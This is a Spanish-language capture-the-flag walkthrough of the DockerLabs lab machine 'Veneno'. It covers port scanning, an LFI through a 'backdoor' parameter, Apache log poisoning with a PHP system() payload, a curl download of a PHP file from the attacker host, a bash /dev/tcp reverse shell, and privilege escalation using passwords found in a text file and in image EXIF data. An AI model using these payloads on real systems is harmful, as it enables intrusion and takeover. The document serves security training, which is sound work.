#MAQUINA #DOCKERLABS #MEDIO
#LFI #LOG_POISONING #RCE
#EXIFTOOL 
<hr>

# RECONOCIMIENTO

Vamos a resolver **Veneno** de la plataforma **DockerLabs**.

   ```bash

Máquina desplegada, su dirección IP es --> 172.17.0.2

```

Primero vamos a hacer un escaneo de puertos rápido:

```bash

nmap -sS --min-rate 5000 -vvv -n -Pn -p- 172.17.0.2 --open
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-05 08:24 CET
Initiating ARP Ping Scan at 08:24
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 08:24, 0.04s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 08:24
Scanning 172.17.0.2 [65535 ports]
Discovered open port 80/tcp on 172.17.0.2
Discovered open port 22/tcp on 172.17.0.2
Completed SYN Stealth Scan at 08:24, 0.51s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.0000030s latency).
Scanned at 2025-02-05 08:24:12 CET for 1s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.71 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)

```

- **`--open`**: Muestra solo los puertos abiertos en la salida.
- **`-sS`**: Especifica un escaneo TCP SYN, que es más sigiloso que un escaneo de conexión completa.
- **`--min-rate 5000`**: Establece la tasa mínima de paquetes enviados a 5000 por segundo, haciendo que el escaneo sea más rápido.
- **`-vvv`**: Aumenta el nivel de verbosidad, proporcionando una salida más detallada durante el escaneo.
- **`-n`**: No resuelve DNS; esto evita retrasos por búsquedas de nombres.
- **`-Pn`**: Trata el objetivo como si estuviera en línea; omite el descubrimiento de hosts.
- **`-p-`**: Escanea todos los 65535 puertos en lugar de solo los más comunes.

**Conclusiones:** El ttl al ser 64 nos dice que es una máquina **Linux**. Además, vemos que tiene el puerto **80(HTTP)** y el puerto **22(SSH)** abiertos.

Ahora vamos a hacer un escaneo con mayor detalle:

   ```bash

nmap -sCV -p22,80 172.17.0.2                
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-05 08:25 CET
Nmap scan report for pressenter.hl (172.17.0.2)
Host is up (0.000015s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 89:9c:7b:99:95:b6:e8:03:5a:6a:d4:69:69:4a:8d:35 (ECDSA)
|_  256 ec:ec:90:44:4e:66:64:22:f6:8b:cd:29:d2:b5:60:6a (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.48 seconds


```

```bash

nmap --script="http-enum" 172.17.0.2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-05 08:25 CET
Nmap scan report for pressenter.hl (172.17.0.2)
Host is up (0.0000030s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
| http-enum: 
|_  /uploads/: Potentially interesting directory w/ listing on 'apache/2.4.58 (ubuntu)'
MAC Address: 02:42:AC:11:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.44 seconds



```

- **`-sC`**: Realiza un escaneo de scripts (Nmap Scripting Engine, NSE). Esto permite ejecutar scripts de `nmap` para obtener información adicional sobre los servicios detectados, como vulnerabilidades, configuraciones o detalles específicos de los mismos.
- **`-sV`**: Realiza la detección de versiones de servicios. Esto intenta identificar la versión exacta del software que está escuchando en un puerto abierto, lo que puede ayudar a determinar si hay vulnerabilidades conocidas.
- **`--script`**:  Ejecutar un script específico.

**Conclusiones:** Podemos sacar:
+ Directorio **uploads** interesante en el puerto 80.

## HTTP (80)

Al revisar la web que hay en el puerto 80, vamos a utilizar **gobuster** para ver directorios interesantes

   ```bash

gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x html,php,js,txt,png,jpg
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,js,txt,png,jpg,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 275]
/.php                 (Status: 403) [Size: 275]
/index.html           (Status: 200) [Size: 10671]
/uploads              (Status: 301) [Size: 310] [--> http://172.17.0.2/uploads/]
/problems.php         (Status: 200) [Size: 10671]
/.php                 (Status: 403) [Size: 275]
/.html                (Status: 403) [Size: 275]
/server-status        (Status: 403) [Size: 275]
Progress: 1543913 / 1543920 (100.00%)
===============================================================
Finished
===============================================================

```

Podemos ver el directorio **uploads** y el **problems.php** como cosas interesantes.

Ya que no podemos subir archivos de primeras, vamos a utilizar **wfuzz** para intentar ver si es vulnerable a un posible **LFI**:

```bash

wfuzz -u "http://172.17.0.2/problems.php?FUZZ=/etc/hosts" -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt --hl=363
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://172.17.0.2/problems.php?FUZZ=/etc/hosts
Total requests: 207643

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                  
=====================================================================

000007273:   200        7 L      16 W       174 Ch      "backdoor"

```

Tenemos un **LFI**.
# EXPLOTACION

Apuntamos al archivo **/etc/passwd**:

```
http://172.17.0.2/problems.php?backdoor=/etc/passwd
```

**Usuarios interesantes -> root,carlos**

Usamos **hydra** para intentar sacar su contraseña y no podemos.

Vamos a volver a usar **wfuzz** para ver que archivos podemos leer y vemos que tenemos acceso a los logs de apache2. Podemos intentar un **log poisoning**.

Para hacerlo, se puede de muchas formas.

Nosotros haremos la siguiente petición :
```bash

curl -s -X GET "http://172.17.0.2/prox" -H "User-Agent: <?php system(\$_GET['cmd']);?>"

```

Y luego al ver el **access.log** podremos colar el comando que queramos:

```

http://172.17.0.2/problems.php?backdoor=/var/log/apache2/access.log&cmd=whoami

```

Por ejemplo con este mostramos www-data.

Lo que podemos es ponernos en escucha por un puerto y mandarnos una reverse shell, pero por alguna razón no funciona.

Vamos a mandar un script php al directorio uploads. Y al entrar a verlo nos otorgara una reverse shell:

```

http://172.17.0.2/problems.php?backdoor=/var/log/apache2/access.log&cmd=curl 172.17.0.1:8000/wp.php -o /var/www/html/uploads/wp.php

```

```php

<?php

/**
* Plugin Name: test-plugin
* Plugin URI: https://www.your-site.com/
* Description: Test.
* Version: 0.1
* Author: your-name
* Author URI: https://www.your-site.com/
**/


        exec("/bin/bash -c 'bash -i > /dev/tcp/172.17.0.1/443 0>&1'");

?>

```

**IMPORTANTE : TARDA UN POCO EN RESPONDER , PACIENCIA.**

YA ESTAMOS COMO WWW-DATA.


# ESCALADA PRIVILEGIOS

Vemos que hay un  archivo en un directorio de la web que no vimos con gobuster:

   ```bash
www-data@a83b794802b1:/$ ls -la var/www/html/
total 40
drwxr-xr-x 1 root root  4096 Jun 29  2024 .
drwxr-xr-x 1 root root  4096 Jun 29  2024 ..
-rw-r--r-- 1 root root   163 Jun 29  2024 antiguo_y_fuerte.txt
-rw-r--r-- 1 root root 10671 Jun 29  2024 index.html
-rw-r--r-- 1 root root   157 Jun 29  2024 problems.php
drwxrwxrwx 1 root root  4096 Feb  5 21:25 uploads
www-data@a83b794802b1:/$ cat var/www/html/antiguo_y_fuerte.txt 
Es imposible que me acuerde de la pass es inhackeable pero se que la tenpo en el mismo fichero desde fa 24 anys. trobala buscala 

soy el unico user del sistema. 


```

Al buscar archivos en todo el sistema de dicha fecha :

```

www-data@a83b794802b1:/usr/share/viejuno$ find / -type f -printf '%TY %p\n' 2>/dev/null | grep '^1999'            
1999 /usr/share/viejuno/inhackeable_pass.txt
www-data@a83b794802b1:/usr/share/viejuno$ cat /usr/share/viejuno/inhackeable_pass.txt
pinguinochocolatero

```

**Contra -> pinguinochocolatero**

YA ESTAMOS COMO CARLOS.

Al irnos a su directorio home vemos muchas carpetas, usamos ls para listar su contenido recursivamente (ver que hay dentro de cada una) :

```bash

carlos@a83b794802b1:~$ ls -la -R

```

En la carpeta55 hay una foto.

Usando **exiftool**:

```

exiftool .toor.jpg            
ExifTool Version Number         : 13.00
File Name                       : .toor.jpg
Directory                       : .
File Size                       : 628 kB
File Modification Date/Time     : 2024:06:29 02:19:05+02:00
File Access Date/Time           : 2025:02:05 12:44:18+01:00
File Inode Change Date/Time     : 2025:02:05 12:43:41+01:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Image Quality                   : pingui1730
Image Width                     : 2048
Image Height                    : 2048
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 2048x2048
Megapixels                      : 4.2

```

**Usuario-> root**
**Contra -> pingui1730**

**YA ESTAMOS COMO ROOT.**